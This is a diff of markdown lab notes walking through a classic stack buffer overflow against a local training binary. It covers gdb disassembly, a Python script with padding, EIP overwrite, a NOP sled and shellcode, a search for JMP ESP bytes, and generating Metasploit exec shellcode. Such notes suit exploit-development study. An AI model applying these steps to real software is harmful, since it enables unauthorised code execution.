@@ -1,10 +1,10 @@
-### 
-#### 
+### Run GDB against the program you want to view
+#### disass command to see what the code is performing and the memory spaces
     gdb func
     disass getuserinput
 _____________________________________________________________________________________________________________________
-### 
-#### 
+### Create a python script to run against the program in gbd.
+#### Buffer to see when the program breaks, EIP to jump to the point in memory, nop sled to push your code into executable space in memory, print to view the output as you update the script. THIS SCRIPT IS FULLY UPDATED!
     buffer = "A" * 62
     
     #eip = "BBBB"
@@ -26,31 +26,27 @@ ________________________________________________________________________________
     
     print(buffer + eip + nop + buf)
 _____________________________________________________________________________________________________________________
-### 
-#### 
+### Open the gdb enviroment to unset the memory.
+#### and the find command to locate the memory thats vulnerable to update your script.
     env - gdb func
     show env
     unset LINES
     unset COLUMNS
     find /b 0xf7de2000 , 0xf7ffe000 , 0xff , 0xe4
 _____________________________________________________________________________________________________________________
-### 
-#### 
+### Open gdb against the program func
+#### testing the script continuously as you UPDATE IT.
     gdb func
     run <<< $(python test.py)
 _____________________________________________________________________________________________________________________
-### 
-#### 
+### Run msfconsole to get the shellcode to run the command in the script.
+#### step will take several attempts of running the last command and pasting into script.
     msfconsole
     use payload/linux/x86/exec
     show options
     set CMD whoami
     show options
     generate -b "\x00" -f python               #copy the output and place into python script may take a few tries.
-_____________________________________________________________________________________________________________________
-### 
-#### 
-
 _____________________________________________________________________________________________________________________
 ### 
 #### 
